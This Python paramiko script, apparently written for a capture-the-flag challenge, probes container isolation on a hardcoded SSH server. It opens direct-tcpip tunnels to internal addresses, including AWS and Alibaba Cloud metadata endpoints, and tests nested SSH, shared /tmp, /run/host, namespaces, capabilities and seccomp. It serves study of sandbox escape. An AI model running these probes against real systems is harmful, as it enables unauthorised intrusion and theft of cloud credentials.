import paramiko
import socket
import time
import sys

"""
关键发现：每次SSH连接都创建一个新的systemd-nspawn容器
- container_uuid 每次都不同
- dropbear运行在宿主机上，为每个连接创建新容器

FakeJumpServer攻击的关键可能是：
- 当使用ProxyJump时，第一次连接建立到跳板机
- 第二次连接通过direct-tcpip通道
- 跳板机可以劫持这个通道

问题是：dropbear如何处理direct-tcpip请求？
- 它是在当前容器内处理，还是在宿主机上处理？
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def test_tunnel_to_host_paths():
    """测试各种可能通往宿主机的路径"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 获取容器IP
    session = transport.open_session()
    session.exec_command("cat /proc/net/fib_trie")
    trie = session.recv(8192).decode()
    print("FIB Trie:")
    print(trie[:1000])
    
    # 尝试连接各种可能的地址
    targets = [
        ("10.0.2.15", 22),   # VM地址
        ("10.0.2.2", 22),    # VM网关
        ("192.168.1.1", 22), # 常见网关
        ("169.254.169.254", 80),  # AWS元数据
        ("100.100.100.200", 80),  # 阿里云元数据
    ]
    
    for target_host, target_port in targets:
        try:
            print(f"\n[*] 尝试 {target_host}:{target_port}...")
            channel = transport.open_channel("direct-tcpip", (target_host, target_port), ('127.0.0.1', 0), timeout=3)
            
            # 尝试读取数据
            channel.settimeout(2)
            try:
                data = channel.recv(1024)
                print(f"    收到: {data[:200]}")
            except:
                print("    无数据（可能是SSH服务，需要发送banner）")
                channel.send(b"SSH-2.0-test\r\n")
                try:
                    data = channel.recv(1024)
                    print(f"    回复: {data[:200]}")
                except:
                    pass
            
            channel.close()
        except Exception as e:
            print(f"    错误: {e}")
    
    ssh.close()

def test_dropbear_direct_tcpip_handling():
    """
    测试dropbear如何处理direct-tcpip
    
    关键问题：direct-tcpip是在容器内部处理还是在宿主机处理？
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试direct-tcpip处理...")
    
    # 获取当前容器的UUID
    session = transport.open_session()
    session.exec_command("printenv container_uuid")
    uuid1 = session.recv(1024).decode().strip()
    print(f"当前容器UUID: {uuid1}")
    
    # 通过direct-tcpip连接到127.0.0.1:22
    channel = transport.open_channel("direct-tcpip", ("127.0.0.1", 22), ('127.0.0.1', 0))
    transport2 = paramiko.Transport(channel)
    transport2.start_client()
    transport2.auth_password(USER, PASSWD)
    
    session2 = transport2.open_session()
    session2.exec_command("printenv container_uuid")
    uuid2 = session2.recv(1024).decode().strip()
    print(f"第二层容器UUID: {uuid2}")
    
    print(f"\nUUID相同: {uuid1 == uuid2}")
    
    if uuid1 != uuid2:
        print("[!] direct-tcpip创建了新容器！")
        print("[!] 这意味着dropbear在容器外部处理direct-tcpip请求")
    
    transport2.close()
    ssh.close()

def test_shared_resources():
    """测试容器之间是否共享某些资源"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 检查共享资源...")
    
    # 创建一个文件
    session = transport.open_session()
    session.exec_command("echo test > /tmp/testfile; cat /tmp/testfile")
    print(f"创建文件: {session.recv(1024).decode()}")
    
    # 在第二层检查这个文件是否存在
    channel = transport.open_channel("direct-tcpip", ("127.0.0.1", 22), ('127.0.0.1', 0))
    transport2 = paramiko.Transport(channel)
    transport2.start_client()
    transport2.auth_password(USER, PASSWD)
    
    session2 = transport2.open_session()
    session2.exec_command("cat /tmp/testfile")
    result = session2.recv(1024).decode()
    print(f"第二层读取: {result}")
    
    if result.strip() == "test":
        print("[!] 文件在第二层存在 - 可能共享/tmp")
    else:
        print("[*] 文件不存在 - 每个容器独立")
    
    # 检查/run/host
    print("\n[*] 检查/run/host目录...")
    session3 = transport.open_session()
    session3.exec_command("ls -la /run/host/")
    print(session3.recv(4096).decode())
    
    session4 = transport.open_session()
    session4.exec_command("cat /run/host/os-release")
    print(session4.recv(4096).decode())
    
    transport2.close()
    ssh.close()

def check_proc_namespace():
    """检查命名空间信息"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 检查命名空间...")
    
    for path in ["/proc/self/ns/", "/proc/1/ns/"]:
        session = transport.open_session()
        session.exec_command(f"ls -la {path}")
        print(f"\n{path}:")
        print(session.recv(4096).decode())
    
    # 检查capabilities
    session = transport.open_session()
    session.exec_command("cat /proc/self/status | grep -i cap")
    print("\nCapabilities:")
    print(session.recv(4096).decode())
    
    # 检查seccomp
    session = transport.open_session()
    session.exec_command("cat /proc/self/status | grep -i seccomp")
    print("\nSeccomp:")
    print(session.recv(4096).decode())
    
    ssh.close()

def test_notify_socket():
    """测试NOTIFY_SOCKET"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 检查notify socket...")
    
    session = transport.open_session()
    session.exec_command("ls -la /run/host/notify")
    print(session.recv(4096).decode())
    
    # 尝试通过socket通信
    session = transport.open_session()
    session.exec_command("stat /run/host/notify")
    print(session.recv(4096).decode())
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 深入分析容器隔离")
    print("="*60)
    
    print("\n[1] 测试direct-tcpip处理")
    test_dropbear_direct_tcpip_handling()
    
    print("\n[2] 测试共享资源")
    test_shared_resources()
    
    print("\n[3] 检查命名空间")
    check_proc_namespace()
    
    print("\n[4] 测试notify socket")
    test_notify_socket()
    
    print("\n[5] 测试通往宿主机的路径")
    test_tunnel_to_host_paths()
